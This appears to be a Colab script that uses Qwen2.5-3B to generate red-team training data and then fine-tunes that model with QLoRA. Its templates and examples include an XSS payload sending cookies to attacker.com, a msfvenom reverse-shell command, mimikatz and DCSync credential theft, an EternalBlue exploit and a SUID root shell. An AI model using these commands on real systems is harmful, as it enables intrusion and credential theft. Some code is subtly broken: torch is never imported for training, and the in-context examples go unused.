#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberSec 4B Model - Colab Complete Version
==========================================
Full replica of original training pipeline for Colab

Usage (Google Colab):
!git clone https://github.com/Look0316/LLM_colab.git
%cd LLM_colab
!python colab_complete.py
"""

import os
import sys
import json
import time
import logging
from datetime import datetime
from typing import List, Dict

# UTF-8 encoding
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

def safe_print(msg):
    try:
        print(msg)
    except:
        pass

# ═══════════════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════════════

CONFIG = {
    # Model config - 使用更小的模型以適配 T4 GPU
    "qwen_model": "Qwen/Qwen2.5-3B-Instruct",
    "base_model": "Qwen/Qwen2.5-3B-Instruct",
    
    # Data config - 減少樣本數加速測試
    "max_samples": 500,
    "data_path": "/content/data/distilled_tinyllm.jsonl",
    "output_dir": "/content/outputs/finetuned_tinyllm_v1",
    
    # Training config
    "num_train_epochs": 3,
    "per_device_train_batch_size": 2,
    "gradient_accumulation_steps": 4,
    "learning_rate": 2e-4,
    "max_seq_length": 1024,
    
    # QLoRA config
    "lora_r": 16,
    "lora_alpha": 32,
    "lora_dropout": 0.05,
    "lora_target_modules": ["q_proj", "k_proj", "v_proj", "o_proj"],
}

# ═══════════════════════════════════════════════════════════════════════════
# Utility Functions
# ═══════════════════════════════════════════════════════════════════════════

def check_gpu():
    """Check GPU status"""
    import torch
    if torch.cuda.is_available():
        gpu_name = torch.cuda.get_device_name(0)
        gpu_mem = torch.cuda.get_device_properties(0).total_memory / (1024**3)
        safe_print(f"\n[OK] GPU: {gpu_name} ({gpu_mem:.1f} GB)")
        
        # Auto adjust batch size
        if gpu_mem >= 14:
            CONFIG["per_device_train_batch_size"] = 4
        elif gpu_mem >= 10:
            CONFIG["per_device_train_batch_size"] = 2
        else:
            CONFIG["per_device_train_batch_size"] = 1
        
        safe_print(f"[OK] Batch size: {CONFIG['per_device_train_batch_size']}")
        return True
    else:
        safe_print("\n[WARNING] No GPU detected!")
        return False

def clean_gpu_memory():
    """Clean GPU memory"""
    import torch
    import gc
    gc.collect()
    torch.cuda.empty_cache()

def print_step(step_num, title):
    """Print step header"""
    safe_print(f"\n{'='*60}")
    safe_print(f"  STEP {step_num}: {title}")
    safe_print(f"{'='*60}")

# ═══════════════════════════════════════════════════════════════════════════
# Install Dependencies
# ═══════════════════════════════════════════════════════════════════════════

def install_dependencies():
    """Install required dependencies"""
    print_step(0, "Installing Dependencies")
    
    import subprocess
    import sys
    
    packages = [
        "transformers>=4.40.0",
        "torch>=2.1.0",
        "accelerate>=0.28.0",
        "peft>=0.10.0",
        "bitsandbytes>=0.41.0",
        "trl>=0.8.0",
        "scikit-learn",
        "tqdm",
        "datasets",
    ]
    
    for pkg in packages:
        try:
            subprocess.check_call([
                sys.executable, "-m", "pip", "install", "-q", pkg
            ])
            safe_print(f"[OK] {pkg}")
        except Exception as e:
            safe_print(f"[WARNING] {pkg}: {e}")
    
    safe_print("[OK] Dependencies installed")

# ═══════════════════════════════════════════════════════════════════════════
# PART 1: Data Generation
# ═══════════════════════════════════════════════════════════════════════════

# Scenario templates (exact same as original)
SCENARIO_TEMPLATES = [
    "You're performing reconnaissance. You notice open ports {ports} on {target}.",
    "During a penetration test, you discover a {service} service running on port {port}.",
    "Initial access achieved via {method}. You've found {finding}.",
    "You're analyzing a web application. You notice {vulnerability_type} in the {component}.",
    "SQL injection confirmed on {parameter}.",
    "XSS found on {page}. The payload {payload} was reflected.",
    "Buffer overflow detected in {binary}. The crash occurs at offset {offset}.",
    "Weak password policy discovered. Current password hash is {hash_type}.",
    "You've compromised {host} as {user}. The next target is {target}.",
    "Found {cred_type} credentials: {creds}.",
    "Lateral movement to {target} successful. Now you have {privilege}.",
    "Current shell is {user}@{host}. You found {vuln} vulnerability.",
    "SUID binary {binary} found. It calls {function}.",
    "Kernel version {version} on {os}. Known exploit is {exploit}.",
]

# Answer templates (exact same as original)
ANSWER_TEMPLATES = {
    "ports": [
        "Run nmap -sV -sC {target} to enumerate services.",
        "Use enum4linux for SMB enumeration."
    ],
    "service": [
        "Check for known CVEs: searchsploit {service} {version}.",
        "Attempt default credential login."
    ],
    "method": [
        "Maintain persistence: add SSH key, create cron job.",
        "Escalate privilege using the found {finding}."
    ],
    "vulnerability_type": [
        "For SQLi, use sqlmap; for XSS, escalate to session hijacking."
    ],
    "SQL injection": [
        "Use sqlmap -u 'URL' --dbs to enumerate databases.",
        "Attempt UNION-based injection."
    ],
    "XSS": [
        "Escalate to account takeover via cookie theft.",
        "Use beef hook for persistent access."
    ],
    "Buffer overflow": [
        "Generate payload: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f python.",
        "Find exact offset with pattern_create."
    ],
    "Hash dumping": [
        "Use mimikatz: sekurlsa::logonpasswords full",
        "Access SAM file: reg save HKLM\\SYSTEM SystemSave"
    ],
    "compromised": [
        "Perform privilege escalation: check sudo -l, kernel exploits.",
        "Use the access to pivot: scan internal network."
    ],
    "credentials": [
        "Use crackmapexec to test credentials across the network.",
        "Escalate: use psexec, wmiexec for lateral movement."
    ],
    "Lateral movement": [
        "Dump LSASS for more credentials, then pivot to domain controller.",
        "Use DCSync to dump domain hashes."
    ],
    "privilege escalation": [
        "Check GTFOBins for SUID binary exploitation.",
        "Use kernel exploit: compile and run CVE-2021-43298."
    ],
    "kernel": [
        "Download and compile kernel exploit, then execute for root shell."
    ],
}

# In-context examples (exact same as original)
INCONTEXT_EXAMPLES = [
    {
        "scenario": "XSS found on login page. The payload <script>alert(1)</script> was reflected.",
        "answer": "Escalate to account takeover via session cookie theft",
        "rationale": """## State: Reflected XSS on login page with user-controllable input

## Hypothesis: Can escalate to account takeover via cookie theft

## Experiment: Submit cookie-stealing payload
```bash
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

## Observation: Attacker server receives request with session cookie

## Success: Yes - Session ID captured

## Next: Use cookie to authenticate as victim user
```bash
curl -b "session=stolen_cookie" http://target.com/admin
```"""
    },
    {
        "scenario": "SQL injection confirmed on user_id parameter in login form.",
        "answer": "Dump database and escalate to RCE",
        "rationale": """## State: SQL injection on login form (authenticated as guest)

## Hypothesis: Can enumerate databases and extract sensitive data

## Experiment: Enumerate databases with sqlmap
```bash
sqlmap -u 'http://target.com/login?user_id=1' --dbs
```

## Observation: Identified 5 databases including 'users'

## Success: Yes - Found admin table with password hashes

## Next: Crack hashes and use for lateral movement
```bash
sqlmap -u 'http://target.com/login?user_id=1' -D users --tables -T admin --dump
```"""
    },
    {
        "scenario": "Found SSH private key for user www-data on compromised server.",
        "answer": "Use key for lateral movement to other servers",
        "rationale": """## State: Have SSH private key for www-data user

## Hypothesis: Can use key to access other servers where this user exists

## Experiment: SSH to other discovered servers
```bash
chmod 600 id_rsa
ssh -i id_rsa www-data@10.10.10.15
```

## Observation: Successfully authenticated to target server

## Success: Yes - Got shell as www-data on 10.10.10.15

## Next: Privilege escalation to root
```bash
sudo -l
find / -perm -4000 2>/dev/null
```"""
    },
    {
        "scenario": "SMBv1 enabled on Windows Server 2019 (10.10.10.5).",
        "answer": "Exploit EternalBlue for initial access",
        "rationale": """## State: SMBv1 enabled on Windows Server 2019

## Hypothesis: MS17-010 vulnerability may be present

## Experiment: Scan for EternalBlue
```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.5
```

## Observation: VULNERABLE - MS17-010 confirmed

## Success: Yes - Target is vulnerable to EternalBlue

## Next: Exploit for reverse shell
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set LHOST 10.10.10.10
run
```"""
    },
    {
        "scenario": "Current shell is www-data@10.10.10.5. You found SUID binary /usr/bin/python3 running as root.",
        "answer": "Exploit SUID binary for root shell",
        "rationale": """## State: Limited shell as www-data, found SUID python3

## Hypothesis: Can escalate to root using python3 SUID

## Experiment: Spawn root shell
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Observation: Root shell obtained!

## Success: Yes - Full root access on 10.10.10.5

## Next: Dump credentials and persist
```bash
cat /etc/shadow
echo "root:password123" | chpasswd
```"""
    },
]

def generate_distilled_data(output_file: str, num_samples: int = 2000) -> str:
    """Generate TinyLLM format data - exact same as original"""
    print_step(1, "Generating TinyLLM Data")
    
    import torch
    from transformers import AutoModelForCausalLM, AutoTokenizer
    import random
    from tqdm import tqdm
    import json
    
    safe_print(f"   Model: {CONFIG['qwen_model']}")
    safe_print(f"   Samples: {num_samples}")
    
    # Create output directory
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    
    # Load model
    safe_print("\n[LOADING] Loading model...")
    tokenizer = AutoTokenizer.from_pretrained(
        CONFIG['qwen_model'], 
        trust_remote_code=True
    )
    model = AutoModelForCausalLM.from_pretrained(
        CONFIG['qwen_model'],
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    safe_print("[OK] Model loaded")
    
    # Generate data
    data = []
    
    safe_print("\n[LOADING] Generating data...")
    for i in tqdm(range(num_samples), desc="Generating"):
        # Random scenario and answer
        scenario = random.choice(SCENARIO_TEMPLATES)
        category = random.choice(list(ANSWER_TEMPLATES.keys()))
        answers = ANSWER_TEMPLATES[category]
        answer = random.choice(answers)
        
        # 5 in-context examples
        examples = random.sample(INCONTEXT_EXAMPLES, min(5, len(INCONTEXT_EXAMPLES)))
        
        # Build conversation (exact same format as original)
        messages = [
            {"role": "system", "content": "You are a professional penetration tester with expertise in Red Team operations."},
            {"role": "user", "content": f"## Scenario: {scenario}\n\n## Instruction: Think step-by-step about the attack chain, including:\n1. State: Current situation\n2. Hypothesis: What is possible\n3. Experiment: What command would you run?\n4. Observation: What would you see?\n5. Success: Yes/No\n6. Next: What would you try next?\n\nProvide the complete attack chain with executable commands."},
        ]
        
        # Generate response
        text = tokenizer.apply_chat_template(
            messages,
            tokenize=False,
            add_generation_prompt=True,
        )
        
        inputs = tokenizer(text, return_tensors="pt").to(model.device)
        
        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=512,
                temperature=0.7,
                top_p=0.9,
                do_sample=True,
            )
        
        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        
        # TinyLLM format (exact same as original)
        sample = {
            "messages": messages + [{"role": "assistant", "content": response}],
            "category": category,
            "scenario": scenario,
            "answer": answer,
            "in_context_examples": examples,
        }
        
        data.append(sample)
        
        # Clean memory every 100 samples
        if (i + 1) % 100 == 0:
            clean_gpu_memory()
    
    # Save
    with open(output_file, 'w', encoding='utf-8') as f:
        for item in data:
            f.write(json.dumps(item, ensure_ascii=False) + '\n')
    
    safe_print(f"\n[OK] Data saved: {output_file}")
    safe_print(f"   Total samples: {len(data)}")
    
    # Unload model
    del model
    clean_gpu_memory()
    
    return output_file

# ═══════════════════════════════════════════════════════════════════════════
# PART 2: Training
# ═══════════════════════════════════════════════════════════════════════════

def load_training_data(data_path: str) -> List[dict]:
    """Load training data - exact same as original"""
    safe_print(f"\n[READING] Loading data: {data_path}")
    samples = []
    with open(data_path, 'r', encoding='utf-8') as f:
        for line in f:
            samples.append(json.loads(line))
    safe_print(f"   Samples: {len(samples)}")
    return samples


def format_sample(sample: dict) -> str:
    """Format sample for training - exact same as original"""
    messages = sample.get("messages", [])
    
    conversation = ""
    for msg in messages:
        role = msg.get("role", "")
        content = msg.get("content", "")
        conversation += f"<|im_start|>{role}\n{content}<|im_end|>\n"
    
    conversation += "<|im_end|>"
    return {"text": conversation}


class TinyLLMDataset:
    """Dataset class - exact same as original"""
    def __init__(self, data, tokenizer, max_length):
        self.data = data
        self.tokenizer = tokenizer
        self.max_length = max_length
    
    def __len__(self):
        return len(self.data)
    
    def __getitem__(self, idx):
        text = self.data[idx]["text"]
        encoding = self.tokenizer(
            text,
            truncation=True,
            max_length=self.max_length,
            padding="max_length",
            return_tensors="pt",
        )
        
        input_ids = encoding["input_ids"].squeeze()
        attention_mask = encoding["attention_mask"].squeeze()
        
        return {
            "input_ids": input_ids,
            "attention_mask": attention_mask,
            "labels": input_ids.clone(),
        }


def train_tinyllm(data_path: str, output_dir: str, num_epochs: int = 3) -> str:
    """QLoRA training - exact same as original"""
    print_step(2, "QLoRA Training")
    
    from transformers import (
        AutoModelForCausalLM,
        AutoTokenizer,
        TrainingArguments,
        Trainer,
        DataCollatorForLanguageModeling
    )
    from peft import LoraConfig, get_peft_model, TaskType
    
    safe_print(f"   Data: {data_path}")
    safe_print(f"   Output: {output_dir}")
    safe_print(f"   Epochs: {num_epochs}")
    
    # Load data
    samples = load_training_data(data_path)
    formatted_data = [format_sample(s) for s in samples]
    
    # Load tokenizer
    tokenizer = AutoTokenizer.from_pretrained(
        CONFIG['base_model'],
        trust_remote_code=True,
        padding_side="right"
    )
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token
    
    # Create dataset
    dataset = TinyLLMDataset(
        formatted_data,
        tokenizer,
        CONFIG["max_seq_length"]
    )
    
    # Load model
    safe_print("\n[LOADING] Loading base model...")
    model = AutoModelForCausalLM.from_pretrained(
        CONFIG['base_model'],
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    
    # QLoRA config (exact same as original)
    lora_config = LoraConfig(
        task_type=TaskType.CAUSAL_LM,
        inference_mode=False,
        r=CONFIG["lora_r"],
        lora_alpha=CONFIG["lora_alpha"],
        lora_dropout=CONFIG["lora_dropout"],
        target_modules=CONFIG["lora_target_modules"],
    )
    
    model = get_peft_model(model, lora_config)
    model.print_trainable_parameters()
    
    # Training arguments (exact same as original)
    training_args = TrainingArguments(
        output_dir=output_dir,
        num_train_epochs=num_epochs,
        per_device_train_batch_size=CONFIG["per_device_train_batch_size"],
        gradient_accumulation_steps=CONFIG["gradient_accumulation_steps"],
        learning_rate=CONFIG["learning_rate"],
        logging_steps=10,
        save_strategy="epoch",
        save_total_limit=2,
        fp16=True,
        report_to="none",
        dataloader_pin_memory=False,
        optim="paged_adamw_8bit",
        warmup_steps=100,
        lr_scheduler_type="cosine",
    )
    
    # Data collator
    data_collator = DataCollatorForLanguageModeling(
        tokenizer=tokenizer,
        mlm=False,
    )
    
    # Trainer
    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=dataset,
        data_collator=data_collator,
    )
    
    # Train
    safe_print("\n[TRAINING] Starting training...")
    trainer.train()
    
    # Save
    os.makedirs(output_dir, exist_ok=True)
    model.save_pretrained(output_dir)
    tokenizer.save_pretrained(output_dir)
    
    safe_print(f"\n[OK] Model saved: {output_dir}")
    
    return output_dir

# ═══════════════════════════════════════════════════════════════════════════
# PART 3: Testing
# ═══════════════════════════════════════════════════════════════════════════

def test_tinyllm(model_path: str):
    """Test function - exact same as original"""
    print_step(3, "Testing Model")
    
    from transformers import AutoModelForCausalLM, AutoTokenizer
    import torch
    
    # Test scenarios (exact same as original)
    test_scenarios = [
        {
            "name": "SQL Injection",
            "scenario": "SQL injection confirmed on user_id parameter in login form"
        },
        {
            "name": "XSS Attack",
            "scenario": "XSS found on search page. The payload <script>alert(1)</script> was reflected."
        },
        {
            "name": "Buffer Overflow",
            "scenario": "Buffer overflow detected in vulnerable binary. The crash occurs at offset 256."
        },
        {
            "name": "SMB Exploit",
            "scenario": "SMBv1 enabled on Windows Server 2019 (10.10.10.5)"
        },
        {
            "name": "Credentials",
            "scenario": "Found SSH private key for user www-data on compromised server"
        },
    ]
    
    # Load model
    safe_print(f"\n[LOADING] Model: {model_path}")
    
    if not os.path.exists(model_path):
        safe_print(f"[ERROR] Model not found: {model_path}")
        return
    
    tokenizer = AutoTokenizer.from_pretrained(model_path, trust_remote_code=True)
    model = AutoModelForCausalLM.from_pretrained(
        model_path,
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    model.eval()
    
    safe_print("[OK] Model loaded\n")
    
    # Test each scenario
    for i, test in enumerate(test_scenarios, 1):
        safe_print(f"{'='*60}")
        safe_print(f"  Test {i}: {test['name']}")
        safe_print(f"{'='*60}")
        safe_print(f"\n[INPUT] {test['scenario']}")
        
        # Build prompt (exact same as original)
        prompt = f"""You are a professional penetration tester.

Scenario: {test['scenario']}

Provide the complete attack chain with executable commands. Include:
- State: Current situation
- Hypothesis: What's possible
- Step-by-step commands with observations
- Final result and next steps

"""
        
        inputs = tokenizer(prompt, return_tensors="pt").to(model.device)
        
        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=512,
                do_sample=True,
                temperature=0.7,
                top_p=0.9,
                pad_token_id=tokenizer.eos_token_id
            )
        
        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        
        # Extract assistant response
        assistant_response = response.split("assistant")[-1].strip()
        
        safe_print(f"\n[OUTPUT]:\n{assistant_response[:800]}")
        
        clean_gpu_memory()
    
    safe_print(f"\n{'='*60}")
    safe_print("  [OK] Testing complete")
    safe_print(f"{'='*60}")

# ═══════════════════════════════════════════════════════════════════════════
# PART 4: Complete Pipeline
# ═══════════════════════════════════════════════════════════════════════════

def run_pipeline():
    """Run complete pipeline"""
    print("\n" + "="*60)
    safe_print("  Cybersecurity 4B Model - Colab Training Pipeline")
    safe_print("="*60)
    
    # Step 0: Check GPU
    print_step(0, "Check GPU")
    has_gpu = check_gpu()
    if not has_gpu:
        safe_print("[WARNING] No GPU - training will be very slow!")
    
    # Step 1: Install dependencies
    install_dependencies()
    
    # Step 2: Generate data
    data_file = generate_distilled_data(
        CONFIG["data_path"],
        CONFIG["max_samples"]
    )
    
    # Step 3: Train
    output_dir = train_tinyllm(
        data_file,
        CONFIG["output_dir"],
        CONFIG["num_train_epochs"],
    )
    
    # Step 4: Test
    test_tinyllm(output_dir)
    
    # Complete
    print("\n" + "="*60)
    safe_print("  [OK] Training Complete!")
    safe_print("="*60)
    safe_print(f"\nModel: {output_dir}")
    safe_print("\nNext steps:")
    safe_print("1. Download model files")
    safe_print("2. Load with transformers for inference")
    safe_print("3. Add RAG for latest CVE data")

# ═══════════════════════════════════════════════════════════════════════════
# Main Function
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        run_pipeline()
    except KeyboardInterrupt:
        safe_print("\n[WARNING] User interrupted")
    except Exception as e:
        safe_print(f"\n[ERROR] {e}")
        import traceback
        traceback.print_exc()
